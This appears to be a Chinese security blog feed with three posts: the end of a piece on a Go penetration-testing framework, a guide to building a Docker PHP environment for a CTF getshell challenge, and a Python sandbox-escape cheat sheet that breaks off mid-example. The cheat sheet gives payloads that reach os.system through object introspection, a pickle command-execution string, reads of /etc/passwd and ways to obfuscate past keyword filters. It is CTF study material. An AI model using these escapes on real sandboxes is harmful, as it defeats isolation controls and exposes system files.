src="https://raw.githubusercontent.com/AmyangXYZ/AssassinGo/master/design-pattern.png" alt="此处输入图片的描述"></p><p>信息收集接口Gatherer、基本攻击接口Attacker、漏洞PoC验证接口基本相同，均包含下列三种方法：</p><ul><li><p>**Set(…interface{})：**设置本函数或PoC所必需的参数，如目标、端口、并发数量等等。</p></li><li><p>**Run()：**函数启动入口。</p></li><li><p>**Report() map[string]interface{}：**返回执行结果，为后续生成报告准备。</p></li></ul><p>而POC接口还需要额外实现Info() string方法，返回该漏洞的基本信息。</p><p>当添加新的功能或更新PoC时仅需编写一个新的.go文件并实现对应接口的方法。</p><p>例如当新公布出一个远程代码执行漏洞的PoC时，我们可直接新建一个xx-rce.go文件（参考已写好的几个POC），实现上述接口，重新编译整个项目之后（Go语言的编译时间仅为数秒）即可在前台调用该POC去检测目标。</p><h2 id="项目进度"><a href="#项目进度" class="headerlink" title="项目进度"></a><strong>项目进度</strong></h2><p>基本功能已开发完，部署了一个demo版本，</p><p>由于服务器性能有限，并未开放注册，大家想体验可以联系我手动注册（<a href="mailto:&#x61;&#109;&#x79;&#97;&#110;&#103;&#46;&#x78;&#x79;&#x7a;&#x40;&#103;&#x6d;&#97;&#105;&#108;&#x2e;&#x63;&#x6f;&#x6d;">amyang.xyz@gmail.com</a>），</p><p>或者在自己本地搭建，必要的shell脚本和docker-compose已写好。</p><p>由于团队人手十分有限，很多地方不是很完善，POC也没有积攒几个，希望大家体谅。</p><h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a><strong>致谢</strong></h2><p>在这个项目的开发完成过程中包括我在内的团队成员都付出了辛勤的努力，在此表示衷心的感谢，团队成员：<br><strong>@Amyang</strong> <strong>@U1in</strong> <strong>@K0rz3n</strong>，同样，我们也期待你的加入。</p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具 渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建docker的 CTF getshell环境</title>
    <link href="/2018/05/17/%E6%90%AD%E5%BB%BAdocker%E7%9A%84%20CTF%20getshell%E7%8E%AF%E5%A2%83/"/>
    <url>/2018/05/17/%E6%90%AD%E5%BB%BAdocker%E7%9A%84%20CTF%20getshell%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<p>因为我这个出题搭建的是一个不需要数据库的 php+Apache环境，所以我就以这个为例进行说明了</p><h2 id="基本的一些概念"><a href="#基本的一些概念" class="headerlink" title="基本的一些概念"></a>基本的一些概念</h2><p>docker build -t 是利用Dockerfile 构建镜像，这个时候可以使用 –name 来给自己的镜像命名<br>docker run 是利用依据这个镜像构建容器，这个时候可以使用 –name 命名你的容器<br>如果容器需要修改配置文件，我们可以选择挂载&#x2F;挂载数据卷的方式，也可以直接COPY&#x2F;ADD来覆盖</p><h2 id="踩过的一些坑："><a href="#踩过的一些坑：" class="headerlink" title="踩过的一些坑："></a>踩过的一些坑：</h2><p>1.不要直接用 php:5.6-apache 这个环境，这个环境的“特色”就是没有php.ini 文件，，如果你出题不需要修改这个这一点可以直接忽略</p><span id="more"></span><p>2.COPY 的源路径一定是相对路径（.&#x2F;），是相对于镜像构建上下文的路径（默认是Dockerfile的路径），目的地址是容器的绝对路径</p><p>3.容器运行的第一命令，RUN 的第一条指令一定是 </p><pre><code class="hljs">apt-get updateapt-get -y ugrade</code></pre><p>这个容器的源早就不能用了,其中特别要注意下面这条命令的 -y 选项</p><pre><code class="hljs">apt-get -y upgrade </code></pre><p>别以为 uprade 的时候和update 一样会一直进行下去，其实这中间还有要你输入Y的地方，不加这个选项在Dockerfile中就会出问题。 </p><p>4.容器在安装东西的时候一定要仔细检查这个安装过程是不是需要人工输入 y&#x2F;n 的，如果需要，在安装的时候就一定要 -y  否则肯定会失败</p><p>5..htaccess 导致访问出现500错误 ，在修改了配置文件以后 使用下面的命令开启URL重写</p><pre><code class="hljs">a2enmod rewrite service apache2 restart    </code></pre><p>6.网站直接访问出现400 错误 是因为 apache 有一个实例页面在 www 目录下，我们需要修改配置文件，设置网站的默认根路径是 &#x2F;var&#x2F;www&#x2F;html </p><p>7.php  header()不能跳转清理缓存ob_start();</p><p>8.出现下面的这个错误要在Dockerfile 里面</p><pre><code class="hljs">debconf: unable to initialize frontend: Dialogdebconf: (TERM is not set, so the dialog frontend is not usable.)debconf: falling back to frontend: Readlinedebconf: unable to initialize frontend: Readlinedebconf: (This frontend requires a controlling tty.)debconf: falling back to frontend: Teletypeinvoke-rc.d: policy-rc.d denied execution of stop.invoke-rc.d: policy-rc.d denied execution of start.</code></pre><p>在Dockerfile的最后添加 </p><pre><code class="hljs">ARG DEBIAN_FRONTED=noninteractive</code></pre><p>9.容器就是一个进程，依赖于命令，命令结束之后容器就会关闭，我们一般选择使用 docker run 来维持这个容器，或者就是使用 exec 外加循环程序外加 -d 后台执行来维持</p><p>10.一直听网上说的什么docker 容器没法保存状态，我居然就信以为真了，我以为docker容器一旦退出或者停止里面的东西就会全部消失，之前配置的都没了，于是我就拼命地写dockerfile,梦想着有一天能直接一键生成我的题目，但是由于我的题目需要配置各种权限，以及修改各种配置文件，导致我在运行dockerfile 的时候出现了各种各样奇奇怪怪的问题，结果我实在是配置不好了，就打算直接手动配置docker,于是我一测试，发现所谓的配置消失的情况并没有出现，容器一旦创建只要你不销毁，那么里面的东西是不会消失的，你做的所有的设置也不会，他们所说的配置消失只是针对你利用 dockerfile再次生成新的容器的时候不会存在你在现有容器中出现的配置而已，那还不好办，到时候我直接</p><pre><code class="hljs">exitdocker exec -d  xxxx bash service apache2 start </code></pre><p>让他后台运行就行了</p><p>11.镜像构建好之后，我们查看镜像可能会不只有一个，这是因为我们的镜像是搭建在别人的基础镜像之上的，所以显示的时候基础镜像也会显示到时候run 的时候不要run错了</p><p>12.不管是生成镜像还是生成容器，我们都最好制定一个名字，这样方便我们定位，方法都是一样的使用 –name 名字</p><h2 id="好用的命令"><a href="#好用的命令" class="headerlink" title="好用的命令"></a>好用的命令</h2><p>停止并删除所有的容器</p><p>docker stop <code>$(docker ps -q)</code> &amp; docker rm <code>$(docker ps -aq)</code></p><p>删除所有的镜像</p><p>docker rmi <code>$(docker images -q) </code></p><h2 id="如何搭建CTF-getshell的环境"><a href="#如何搭建CTF-getshell的环境" class="headerlink" title="如何搭建CTF getshell的环境"></a>如何搭建CTF getshell的环境</h2><p>一直做CTF getshell 的题目，自己也想过这个问题：“师傅们的权限是怎么配置出来的，我都getshell了，为什么还是不能改其他的文件”，但是想想这个就是一个非常复杂的问题，因为懒惰，我就是自己没有试过怎么实现的……正如那句话，出来混总是要还的，今天欠下的债，早晚都得补上。这次借着给校赛出题我就挑战了一下自己，学习实践了一下如何配置这个环境。</p><h3 id="1-首先明确的一个问题"><a href="#1-首先明确的一个问题" class="headerlink" title="1.首先明确的一个问题"></a>1.首先明确的一个问题</h3><p>我们getshell一般使用的都是菜刀，毕竟菜刀比较方便嘛，当然如果是就是找一个flag什么的直接hackbar就能搞定了，要是其他需求就要自己写脚本了。</p><p>那么你知不知道菜刀连接上去是什么权限呢？</p><pre><code class="hljs">正解：其实菜刀连接上去默认是 www-data 的权限</code></pre><p>不信自己去试一下</p><h3 id="2-如何限制-www-data-的权限？"><a href="#2-如何限制-www-data-的权限？" class="headerlink" title="2.如何限制 www-data 的权限？"></a>2.如何限制 www-data 的权限？</h3><p>没错，这就是本文的重点了，<br>首先我们需要创建一个 apache用户组 并在 apache 用户组中创建一个 apache 用户</p><pre><code class="hljs">groupadd apacheuseradd -r -g apache apache </code></pre><p>接下来我们就要把我们的web目录的全部文件改成属于apache组的apache用户的（因为是docker 所以我的web目录里只有我这一道题）</p><pre><code class="hljs">chown -R apache . chgrp -R apache . </code></pre><p>然后我们给他们744的权限，也就是只读，那他们 www-data 用户就凉了</p><pre><code class="hljs">chmod 744 -R .</code></pre><p>接下来还有最最重要的一步，就是我们必须将apache配置文件 apache2.conf （这个配置文件的名字要根据不同的环境而定，也有可能是 httpd.conf)里面的 apache的启动权限设置为Apache用户和Apache用户组。（找到配置文件里面的 USER 和 GROUP 然后我们将其都改成apache 就行了）</p><pre><code class="hljs">USER apache GROUP apache </code></pre><p>最后别忘了重启 apache 哦！</p><p><strong>因为这里涉及到权限的问题，比较复杂，我会更新这篇文章或者新开一篇文章</strong></p><p>下面是关于 Shell 权限的探究的文章地址：</p><p><a href="http://www.k0rz3n.com/2018/11/07/%E5%85%B3%E4%BA%8E%20Shell%20%E6%9D%83%E9%99%90%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8E%A2%E7%A9%B6/">关于 Shell 权限的一些探究</a></p><h3 id="3-最终的Dockerfile"><a href="#3-最终的Dockerfile" class="headerlink" title="3.最终的Dockerfile"></a>3.最终的Dockerfile</h3><p>下面是我写的dockerfile 的大致内容 (直接运行不一定可以，只是给大家一个参考)，由于没能一步生成题目，于是下面有一些手动配置的东西                                           </p><p>Dockerfile</p><pre><code class="hljs">#创建基础镜像                                               FROM linode/lamp#导入题目代码COPY ./test.zip  /var/www/html/test.zip#更新源以及安装服务修改权限RUN apt-get update \    &amp;&amp; apt-get -y upgrade \    &amp;&amp; apt-get install -y  vim \    &amp;&amp; service apache2 start \    &amp;&amp; cd /usr/share/apache2 \    &amp;&amp; groupadd apache \    &amp;&amp; useradd -r -g apache apache \    &amp;&amp; chown -R apache . \    &amp;&amp; chgrp -R apache . \    &amp;&amp; chmod 744 -R .#安装zip软件对文件解压RUN apt-get install -y zip \    &amp;&amp; unzip /var/www/html/test.zip \#删除压缩包    &amp;&amp; rm -rf /var/www/html/test.zip \#修改权限（与题目有关）    &amp;&amp; chmod 777 /var/www/html/Uploads \#移除默认的目录    &amp;&amp; rm -rf /var/www/example.com \#生成新的log目录    &amp;&amp; mkdir /var/www/log </code></pre><p>一些手动的配置:</p><pre><code class="hljs">1.修改apache 的网站根路径为html（在这个文件里：/etc/apache2/sites-enabled/example.com.conf）2.修改apache2.conf 实现URL重写（因为我用了.htaccess）3.修改apache2.conf 里面的 USER GROUP 为 apache4.修改php.ini（与本题有关）</code></pre><p>使URL重写生效</p><pre><code class="hljs">a2enmod rewrite service apache2 restart</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>备忘 dcoker getshell CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python 沙盒逃逸备忘</title>
    <link href="/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/"/>
    <url>/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/</url>
    
    <content type="html"><![CDATA[<h2 id="一、python-绕过沙盒中常见的函数、属性、模块解释（备忘）"><a href="#一、python-绕过沙盒中常见的函数、属性、模块解释（备忘）" class="headerlink" title="一、python 绕过沙盒中常见的函数、属性、模块解释（备忘）"></a>一、python 绕过沙盒中常见的函数、属性、模块解释（备忘）</h2><h3 id="1-func-globals"><a href="#1-func-globals" class="headerlink" title="1.func_globals"></a>1.func_globals</h3><p>返回包含函数全局变量的字典的引用————————定义函数的模块的全局命名空间。<br>function.func_globals</p><pre><code class="hljs">&gt;&gt;&gt; def foo(): pass...&gt;&gt;&gt; foo.func_globals&#123;&#39;__builtins__&#39;: &lt;module &#39;__builtin__&#39; (built-in)&gt;, &#39;__name__&#39;: &#39;__main__&#39;, &#39;foo&#39;: &lt;function     foo at 0x7f3a056c7938&gt;, &#39;__doc__&#39;: None, &#39;__package__&#39;: None&#125;</code></pre><span id="more"></span><h3 id="2-getattribute"><a href="#2-getattribute" class="headerlink" title="2.__getattribute__"></a>2.<code>__getattribute__</code></h3><p>被调用无条件地实现类的实例的属性访问。</p><p>object. <strong>getattribute</strong>(self, name)<br>1）self 必需的。类的实例，在调用时自动传递。<br>2）name 必需的。属性的名称。</p><pre><code class="hljs">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&#39;func_globals&#39;)</code></pre><h3 id="3-dict"><a href="#3-dict" class="headerlink" title="3.__dict__"></a>3.<code>__dict__</code></h3><p>模块对象有一个由dictionary对象实现的名称空间(这是由模块中定义的函数的func_globals属性引用的字典)。属性引用在本词典中被翻译为查找，例如，<br>m.x相当于m.<strong>dict</strong> [“x”]。</p><pre><code class="hljs">&gt;&gt;&gt; &#39;&#39;.__class__.__dict__[&#39;upper&#39;]  &lt;method &#39;upper&#39; of &#39;str&#39; objects&gt;&gt;&gt;&gt; &#39;&#39;.__class__.upper&lt;method &#39;upper&#39; of &#39;str&#39; objects&gt;</code></pre><h3 id="4-dir"><a href="#4-dir" class="headerlink" title="4.dir()"></a>4.dir()</h3><p>将显示对象的属性的名称，<code>__dict__</code>是dir()的子集<br>dir ([object])</p><pre><code class="hljs">&gt;&gt;&gt; dir(&#39;&#39;.__class__)[&#39;__add__&#39;, &#39;__class__&#39;, &#39;__contains__&#39;, &#39;__delattr__&#39;, &#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__getattribute__&#39;, &#39;__getitem__&#39;, &#39;__getnewargs__&#39;, &#39;__getslice__&#39;, &#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__le__&#39;, &#39;__len__&#39;, &#39;__lt__&#39;, &#39;__mod__&#39;, &#39;__mul__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__rmod__&#39;, &#39;__rmul__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;_formatter_field_name_split&#39;, &#39;_formatter_parser&#39;, &#39;capitalize&#39;, &#39;center&#39;, &#39;count&#39;, &#39;decode&#39;, &#39;encode&#39;, &#39;endswith&#39;, &#39;expandtabs&#39;, &#39;find&#39;, &#39;format&#39;, &#39;index&#39;, &#39;isalnum&#39;, &#39;isalpha&#39;, &#39;isdigit&#39;, &#39;islower&#39;, &#39;isspace&#39;, &#39;istitle&#39;, &#39;isupper&#39;, &#39;join&#39;, &#39;ljust&#39;, &#39;lower&#39;, &#39;lstrip&#39;, &#39;partition&#39;, &#39;replace&#39;, &#39;rfind&#39;, &#39;rindex&#39;, &#39;rjust&#39;, &#39;rpartition&#39;, &#39;rsplit&#39;, &#39;rstrip&#39;, &#39;split&#39;, &#39;splitlines&#39;, &#39;startswith&#39;, &#39;strip&#39;, &#39;swapcase&#39;, &#39;title&#39;, &#39;translate&#39;, &#39;upper&#39;, &#39;zfill&#39;]</code></pre><h3 id="5-base"><a href="#5-base" class="headerlink" title="5.__base__"></a>5.<code>__base__</code></h3><p>每个类都有一个<code>__base__</code>属性能列出器基类<br><strong>注意：</strong><code>__base__</code> 和 <code>__bases__</code>的区别<br>他们都是返回当前类的基类，只不过<code>__bases__</code>返回的是一个元祖</p><pre><code class="hljs">&gt;&gt;&gt; &#39;&#39;.__class__.__base__&lt;type &#39;basestring&#39;&gt;&gt;&gt;&gt; &#39;&#39;.__class__.__bases__(&lt;type &#39;basestring&#39;&gt;,)</code></pre><h3 id="6-mro"><a href="#6-mro" class="headerlink" title="6.__mro__"></a>6.<code>__mro__</code></h3><p>递归地显示父类一直到 object </p><pre><code class="hljs">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)</code></pre><h3 id="7-subclasses"><a href="#7-subclasses" class="headerlink" title="7.__subclasses__()[]"></a>7.<code>__subclasses__</code>()[]</h3><p>获取子类</p><pre><code class="hljs">&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40]&lt;type &#39;file&#39;&gt;</code></pre><h3 id="8-import"><a href="#8-import" class="headerlink" title="8.__import__"></a>8.<code>__import__</code></h3><p>import 一个模块</p><p><code>__import__</code> (name)</p><pre><code class="hljs">&gt;&gt;&gt; __import__(&#39;os&#39;)&lt;module &#39;os&#39; from &#39;/usr/lib/python2.7/os.pyc&#39;&gt;</code></pre><h3 id="9-bulitin"><a href="#9-bulitin" class="headerlink" title="9.__bulitin__"></a>9.<code>__bulitin__</code></h3><p>Python的内建模块，该内建模块中的功能可以直接使用，不用在其前添加内建模块前缀<br>在Python2.X版本中，内建模块被命名为<code>__builtin__</code>，而到了Python3.X版本中，却更名为builtins。</p><h3 id="10-builtins"><a href="#10-builtins" class="headerlink" title="10.__builtins__"></a>10.<code>__builtins__</code></h3><p>是对内建模块的一个引用<br>这个和<code> __builtin__</code>有一些区别</p><p>1）无论任何地方要想使用内建模块，都必须在该位置所处的作用域中导入<code>__builtin__</code>内建模块;而对于<code>__builtins__</code>却不用导入，它在任何模块都直接可见，可以把它当作内建模块直接使用</p><p>2）<code>__builtins__</code>虽是对内建模块的引用，但这个引用要看是使用<code>__builtins__</code>的模块是哪个模块</p><pre><code class="hljs">① 在主模块__main__中：__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此② 在__main__模块中：__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身。它在任何地方都可见。此时__builtins__的类型是字典。</code></pre><h3 id="11-reload"><a href="#11-reload" class="headerlink" title="11.reload"></a>11.reload</h3><p>重新加载之前导入的模块<br>reload (module)</p><pre><code class="hljs">&gt;&gt;&gt; import sys&gt;&gt;&gt; reload(sys)&lt;module &#39;sys&#39; (built-in)&gt;</code></pre><h3 id="12-getattr"><a href="#12-getattr" class="headerlink" title="12.getattr"></a>12.getattr</h3><p>返回对象的命名属性的值。<br>getattr (object, name)<br>相当于 object.name<br>name 必须是一个字符串</p><pre><code class="hljs">&gt;&gt;&gt; class A():...     bar =1...&gt;&gt;&gt; a = A()&gt;&gt;&gt; getattr(a,&#39;bar&#39;)1</code></pre><h3 id="13-getattr"><a href="#13-getattr" class="headerlink" title="13.__getattr__"></a>13.<code>__getattr__</code></h3><p>当属性查找没有在通常的位置找到属性时调用(例如，它不是实例属性，也不是在类树中找到self)</p><h3 id="14-name"><a href="#14-name" class="headerlink" title="14.__name__"></a>14.<code>__name__</code></h3><p>这个值获得的只是一个字符串，不是模块的引用<br>要使用sys.modules[<code>__name__</code>]才获得的是模块的引用</p><pre><code class="hljs">&gt;&gt;&gt; sys.modules[&#39;__main__&#39;]&lt;module &#39;__main__&#39; (built-in)&gt;</code></pre><h3 id="15-func-code"><a href="#15-func-code" class="headerlink" title="15.func_code"></a>15.func_code</h3><p>返回表示已编译函数体的代码对象。</p><pre><code class="hljs">function.func_code&gt;&gt;&gt; def foo():...     a=1...&gt;&gt;&gt; foo.func_code&lt;code object foo at 0x7f3a0570d930, file &quot;&lt;stdin&gt;&quot;, line 1&gt;</code></pre><p>**注意：**这个代码对象必须存在几个参数</p><p>co_argcount  这个参数是返回该函数的参数</p><pre><code class="hljs">&gt;&gt;&gt; foo.func_code.co_argcount0    </code></pre><p>co_code 返回函数的字节码（可用dis.dis（字节码）将其转换为汇编格式）</p><pre><code class="hljs">&gt;&gt;&gt; foo.func_code.co_code&#39;d\x01\x00&#125;\x00\x00d\x00\x00S&#39;</code></pre><h3 id="16-timeit-模块"><a href="#16-timeit-模块" class="headerlink" title="16.timeit 模块"></a>16.timeit 模块</h3><p>这个模块是用来测试代码的执行时间的，能执行代码自然能执行命令<br>使用前需要导入timeit</p><p>使用：</p><p>timeit(命令，number&#x3D;1)</p><pre><code class="hljs">&gt;&gt;&gt; import timeit&gt;&gt;&gt; timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;dir&#39;)&quot;,number=1)</code></pre><p>其中命令是字符串的形式</p><h3 id="17-platform-模块"><a href="#17-platform-模块" class="headerlink" title="17.platform 模块"></a>17.platform 模块</h3><p>由名字可以知道这个模块和平台有关，里面的函数主要是为了返回和平台的一些信息，但是我们还是可以调用<br>popen 这个函数执行命令</p><pre><code class="hljs">print platform.popen(&#39;命令&#39;,mode=&#39;r&#39;,bufsize= -1).read()</code></pre><h3 id="18-globals"><a href="#18-globals" class="headerlink" title="18.__globals__"></a>18.<code>__globals__</code></h3><p><code>function.__globals__</code> 等同于globals()，dir() 的结果是上面两个的键值<br>在fuzz 中常常和 <code>__init__</code>配合使用,<code>__init__</code> 一般跟在类的后面，相当于实例化这个类</p><pre><code class="hljs"> [].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></pre><h3 id="19-call"><a href="#19-call" class="headerlink" title="19.__call__"></a>19.<code>__call__</code></h3><p>使实例能够像函数一样被调用<br> x.<strong>call</strong> 等同于 x()</p><pre><code class="hljs">&gt;&gt;&gt; func.__call__&lt;method-wrapper &#39;__call__&#39; of function object at 0x7f3a056c7e60&gt;</code></pre><h3 id="20-pickle"><a href="#20-pickle" class="headerlink" title="20.pickle"></a>20.pickle</h3><p>这个是python 的一个序列化的方法，用于将对象存储在字符串对象中，实现对象的持久化</p><p>基本的语法：<br>序列化：</p><pre><code class="hljs">import pickletest=(&#39;this is a test&#39;,3.14,[1,2,3,&quot;hh&quot;])p=pickle.dumps(test)</code></pre><p>反序列化：</p><pre><code class="hljs">n=pickle.loads(p)</code></pre><p>我们可以通过 pickle 的方式加载命令</p><pre><code class="hljs">pickle.loads(b&quot;cos\nsystem\n(S&#39;ls&#39;\ntR.&quot;)</code></pre><h3 id="21-os-subprocess-commands"><a href="#21-os-subprocess-commands" class="headerlink" title="21.os&#x2F;subprocess&#x2F;commands"></a>21.os&#x2F;subprocess&#x2F;commands</h3><pre><code class="hljs">os.system(&#39;ifconfig&#39;)os.popen(&#39;ifconfig&#39;)commands.getoutput(&#39;ifconfig&#39;)commands.getstatusoutput(&#39;ifconfig&#39;)subprocess.call([&#39;ifconfig&#39;],shell=True)</code></pre><p>这里重点说一下subprocess 吧<br>1.subprocess.run()<br>Python 3.5中新增的函数。执行指定的命令，等待命令执行完成后返回一个包含执行结果的CompletedProcess类的实例。</p><p>2.subprocess.call()<br>执行指定的命令，返回命令执行状态，其功能类似于os.system(cmd)。</p><p>3.subprocess.check_call()<br>Python 2.5中新增的函数。 执行指定的命令，如果执行成功则返回状态码，否则抛出异常。其功能等价于subprocess.run(…, check&#x3D;True)。</p><p>4.subprocess.check_output()<br>Python 2.7中新增的的函数。执行指定的命令，如果执行状态码为0则返回命令执行结果，否则抛出异常。</p><p>5.subprocess.getoutput(cmd)<br>接收字符串格式的命令，执行命令并返回执行结果，其功能类似于os.popen(cmd).read()和commands.getoutput(cmd)。</p><p>6.subprocess.getstatusoutput(cmd)<br>执行cmd命令，返回一个元组(命令执行状态,命令执行结果输出)，其功能类似于commands.getstatusoutput()。</p><h3 id="22-eval-exec-execfile"><a href="#22-eval-exec-execfile" class="headerlink" title="22.eval&#x2F;exec&#x2F;execfile"></a>22.eval&#x2F;exec&#x2F;execfile</h3><p>1.eval(expression):<br>返回python 表达式执行的结果</p><p>2.exec(source)<br>动态执行python代码。也就是说exec可以执行复杂的python代码，而不像eval函数那样只能计算一个表达式的值。exec函数的返回值永远为None。</p><p>3.execfile(filename)<br>执行一个文件的内容<br>文件是将被解析为python序列的类似于模块的文件</p><h3 id="23-importlib模块"><a href="#23-importlib模块" class="headerlink" title="23.importlib模块"></a>23.importlib模块</h3><pre><code class="hljs">import importlibimportlib.import_module(module)</code></pre><p>他可以代替import 非常好</p><h2 id="二、什么是python-的沙箱逃逸"><a href="#二、什么是python-的沙箱逃逸" class="headerlink" title="二、什么是python 的沙箱逃逸"></a>二、什么是python 的沙箱逃逸</h2><p>所谓的沙箱逃逸就是从一个被阉割和做了严格限制的python执行环境中获取到更高的权限,甚至getshell,这是我们的最终的目的，但是实现这个目标之前我们必须解决的就是如何绕过重重的waf去使用python执行命令</p><p>python 能执行命令或者存在执行命令功能的函数是一定的，但是他的存在形式是多样的，他过滤了这种形式我们就换一种形式表示，正所谓<strong>曲线救国</strong></p><h2 id="三、攻与防的战争"><a href="#三、攻与防的战争" class="headerlink" title="三、攻与防的战争"></a>三、攻与防的战争</h2><p>简单的梳理一下思路：</p><p>1.我们想直接引入执行命令的模块os等<br>遭遇过滤：</p><pre><code class="hljs">re.compile(&#39;import\s+(os|commands|subprocess|sys)&#39;)</code></pre><p>2.我们不直接使用import 用<code>__import__()</code>取而代之<br>遭遇过滤：<code>__import__(module)</code></p><p>3.我们不直接用<code>__import__(module)</code> 转换编码<br><code>__import__(&quot;pbzznaqf&quot;.decode(&#39;rot_13&#39;))</code><br>遭遇过滤<code>__import__</code></p><p>4.不用<code>__import__</code>行不行？当然可以，我们有内建函数直接调用<br><code>__bulitin__</code>&#x2F;<code> __bulitins__</code><br>常见的一些危险的函数都是<code>__builtin__</code>里面的，我们可以直接用 eval() exec() execfile()<br>遭遇过滤：把<code>__builtin__</code> 中的危险函数都del掉，看你怎么绕</p><p>5.reload() 函数重新加载完整的没有阉割的<code>__builtin__</code><br>reload(<code>__builtin__</code>)<br>遭遇过滤：reload()也是一个内建函数，如果我们在<code>__builtin__</code>中把reload()也del掉呢？</p><p>6.imp模块也是一个可以引入东西的一个模块<br>import imp<br>imp.reload(<code>__builtin__</code>)<br>再次成功引入<br>遭遇过滤：看来还是没有从源头del干净，我们知道python 的模块其实都存放在sys.modules中，不要啥就删啥。</p><pre><code class="hljs">sys.modules[&#39;os&#39;]=None</code></pre><p>这样就OK了</p><p>7.这回问题有点棘手，要知道如何应对还要仔细分析一下import的步骤<br>import 的步骤：</p><p>1）如果是 import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A<br>2）如果是 from A import B，先为 A 创建 module 对象，再解析A，从中寻找B并填充到 A 的 dict 中</p><p>那我们可以向更源头追溯<br>我们都知道任何的模块归根道理都是文件，只要文件还在，我们就一定有办法！<br>比如类unix 的系统中，os 模块的路径一般都是&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;os.py，那我们就直接写这个</p><pre><code class="hljs">import syssys.modules[&#39;os&#39;] = &#39;/usr/lib/python2.7/os.py&#39;import os</code></pre><p>遭遇过滤：我把你sys也一并del，让你用！哼</p><p>8.和上面一样的思路，文件还在我们就直接用文件，import 的本质就是把对应的模块文件执行一遍</p><pre><code class="hljs">execfile(&#39;/usr/lib/python2.7/os.py&#39;)system(&#39;cat /etc/passwd&#39;)</code></pre><p>遭遇过滤：execfile() 别用了</p><p>9.那我用文件读取函数读入文件，然后再exec() 也能实现一样的效果</p><p>遭遇过滤：不耐烦了，我也不过滤了，直接删文件</p><p>10.这样的话，我就想起了，没有编译器手写编译器的梗，这里完全可以用嘛。。。。<br>但是这样鲁莽地删除关键函数文件是很危险的，很容易出现莫名的依赖问题，不推荐使用</p><p>好家伙。。。。这一串攻防对决真的是非常的精彩了，淋漓尽致地展现了攻与防的较量</p><h2 id="四、整理一些小trick"><a href="#四、整理一些小trick" class="headerlink" title="四、整理一些小trick"></a>四、整理一些小trick</h2><p>1.完整过滤整个匹配语句我们只要使用变量替换的方式绕过</p><pre><code class="hljs">a = openprint(a(&quot;/etc/passwd&quot;).read())</code></pre><p>2.函数名后面加点空格换一行都能执行</p><pre><code class="hljs">print open(&quot;/etc/passwd&quot;).read()</code></pre><p>3.使用第三方库的执行命令的函数<br>如果程序中调用了第三方的库，恰好这个库有执行命令的函数，那么肯定是再好不过了</p><pre><code class="hljs">from numpy.distutils.exec_command import _exec_command as systemsystem(&quot;ls /&quot;)</code></pre><p>4.使用别名</p><pre><code class="hljs">import os as o</code></pre><p>5.字符串拼接</p><pre><code class="hljs">&quot;l&quot;+&quot;s&quot;&quot;func_global&quot;+&quot;s&quot;</code></pre><p>6.字符串编码或者其他操作<br>如果过滤的是键值对中的key(为了强调是字符串类型)<br>方法一：使用编码的转换</p><pre><code class="hljs">&#39;X19pbXBvcnRfXw==&#39;.decode(&#39;base64&#39;)</code></pre><p>方法二：使用python的字符串操作</p><pre><code class="hljs">s = &quot;emit&quot;s = s [::-1]print a[s]</code></pre><h2 id="五、魔法方法"><a href="#五、魔法方法" class="headerlink" title="五、魔法方法"></a>五、魔法方法</h2><p>这节是基于之前我开始讲的那些基本的概念和语法的，如果不了解还是请往第一节看，这个很重要，因为这个大概就是曲线救国的精髓了</p><h3 id="1-魔法方法简介"><a href="#1-魔法方法简介" class="headerlink" title="1.魔法方法简介"></a>1.魔法方法简介</h3><p>传说，Python 天生体内就拥有着王的印记，它们总是被双下划线包围，他们是面向对象的python的灵魂， 国难当头他们就被激发出来，曲线救国……</p><p>所谓曲线救国的“曲线”,就是对方封锁了从山下上半山腰营地的道路，那我们可以偷偷从山背后上山到山顶，然后从山顶下到半山腰的营地偷袭。</p><h4 id="2-一切皆对象的py"><a href="#2-一切皆对象的py" class="headerlink" title="2.一切皆对象的py"></a>2.一切皆对象的py</h4><p>我们看看python是怎么一切皆对象的</p><pre><code class="hljs">&gt;&gt;&gt; type([])&lt;type &#39;list&#39;&gt;&gt;&gt;&gt; type(1)&lt;type &#39;int&#39;&gt;&gt;&gt;&gt; type(1.1)&lt;type &#39;float&#39;&gt;&gt;&gt;&gt; type(&#39;&#39;)&lt;type &#39;str&#39;&gt;&gt;&gt;&gt; type(())&lt;type &#39;tuple&#39;&gt;&gt;&gt;&gt; type(&#123;&#125;)&lt;type &#39;dict&#39;&gt;</code></pre><p>这些类型都是对象，我现在就以 <code>&#39;&#39;</code> 为例</p><p>1)我们可以从一个对象实例向上追溯到他的类<br><code>&#39;&#39;.__class__</code></p><pre><code class="hljs">&gt;&gt;&gt; type(&#39;&#39;.__class__)&lt;type 